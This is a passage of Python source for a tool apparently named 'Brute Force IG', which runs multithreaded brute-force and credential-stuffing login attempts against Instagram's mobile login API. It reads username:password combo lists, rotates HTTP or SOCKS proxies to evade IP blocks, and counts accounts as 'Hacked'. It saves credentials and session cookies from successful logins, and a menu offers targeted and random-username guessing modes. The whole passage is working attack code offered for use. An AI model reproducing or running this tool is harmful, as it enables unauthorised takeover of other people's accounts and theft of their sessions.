			exit(input('\n[-] The file name is incorrect !\n'))
		try:self.modPRX=int(input("""[$] Choose the type of proxy : 
	1-[ http/s ] | 2-[ socks4/5 ]
[$] Enter : """))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		if self.modPRX==1:pass
		elif self.modPRX==2:pass
		else:exit(input('[!] Please enter only one of the numbers written ..'))
		self.pr = input('[$] Enter name file proxy : ')
		try:self.proxy =  open(self.pr,'r').read().splitlines()
		except FileNotFoundError:
			exit(input('\n[-] The file name is incorrect !\n'))
		try:self.trt=int(input('[+] Enter threading : '))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		print('\t\t━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
		self.Trts()
	def Log_Combo(self):
		while True:
			list = self.file.readline().split('\n')[0]
			user = list.split(':')[0]
			if user=='':
				threading.Thread(target=Exit).start()
				exit()
			try:pess = list.split(':')[1]
			except IndexError:pass
			else:
				proxylist = []
				for pro in self.proxy:
					proxylist.append(pro)
					run = str(random.choice(proxylist))
				try:
					if self.modPRX==1:
						PROXY = {
							"http": f"http://{run}",
							"https": f"http://{run}"}
					elif self.modPRX==2:
						PROXY = {
							"socks4": f"socks4://{run}",
							"socks5": f"socks5://{run}"}
					get = post('https://i.instagram.com/api/v1/accounts/login/', headers={'Host':'i.instagram.com','Accept':'*/*','User-Agent': User_Agent(),'Cookie':'missing', 'Accept-Encoding':'gzip, deflate', 'Accept-Language':'en-US', 'X-IG-Capabilities':'3brTvw==','X-IG-Connection-Type':'WIFI', 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', },data={'uuid': uuid.json()['uuid'],'password': pess,'username': user, 'device_id': uuid.json()['uuid'],'from_reg':'false','_csrftoken':'missing', 'login_attempt_countn':'0'}, proxies=PROXY, allow_redirects=True)
					if login in get.text:
						self.hack+=1
						print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
						coke = get.cookies
						try:
							sisn = get.cookies['sessionid']
							threading.Thread(target=Info_user(user,pess,coke,sisn)).start()
						except KeyError:
							threading.Thread(target=All_Seve.SeveHck(user,pess,coke)).start()
					elif errorPas in get.text:
						self.err+=1
						print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					elif 'unusable_password' in get.text:
						self.err+=1
						print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					elif errorNam in get.text:
						self.err+=1
						print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					elif band_use in get.text:
						self.ban+=1
						print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
						threading.Thread(target=All_Seve.SeveBand(user,pess)).start()
					elif secure in get.text:
						self.secur+=1
						print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
						threading.Thread(target=All_Seve.SeveScour(user,pess)).start()
					elif 'ip_block' in get.text:
						self.prox+=1
						print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					elif errorFUOt in get.text:
						self.err+=1
						print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					elif withs in get.text:
						self.prox+=1
						print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					elif errReq in get.text:
						self.prox+=1
						print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					elif none in get.text:
						self.err+=1
						print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					else:
						self.nones+=1
						print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				except requests.exceptions.ConnectionError:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				except KeyboardInterrupt:Exit()
				except requests.exceptions.ReadTimeout:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
	def Trts(self):
		theards =[]
		for i in range(self.trt):
			trts = threading.Thread(target=self.Log_Combo)
			trts.start()
			theards.append(trts)
		for trts2 in theards:
			trts2.join()
if __name__ == '__main__':
	mode=input(f"""
     {Blou} _____            _        ______                  {red} _____ _____ 
     {Blou}| ___ \          | |       |  ___|                 {red}|_   _|  __ \\
     {Blou}| |_/ /_ __ _   _| |_ ___  | |_ ___  _ __ ___ ___    {red}| | | |  \/
     {Blou}| ___ \ '__| | | | __/ _ \ |  _/ _ \| '__/ __/ _ \   {red}| | | | __ 
     {Blou}| |_/ / |  | |_| | ||  __/ | || (_) | | | (_|  __/  {red}_{red}| |_| |_\ \\
     {Blou}\____/|_|   \__,_|\__\___| \_| \___/|_|  \___\___| {red} \___/ \____/
                           BY Mr.JOKER @221298 {wit}


- 1 ) Guess by combo list (username:password)
- 2 ) Guess by password list(random username)
- 3 ) Guess by password list(target username)
- 4 ) Guess with one password (random username)
- 5 ) Auto Guess (random username and password)
- 6 ) Exit(0)

[$] Entser: """)
	if mode =='1':hacker_instagram_ComboList()
	elif mode=='2':hacker_instagram_randomUser_passLiest()
	elif mode=='3':hacker_instagram_1Target_passLiest()
	elif mode=='4':hacker_instagram_Rnadom_username()
	elif mode=='5':hacker_instagram_Check_automatic()
	else:Exit()
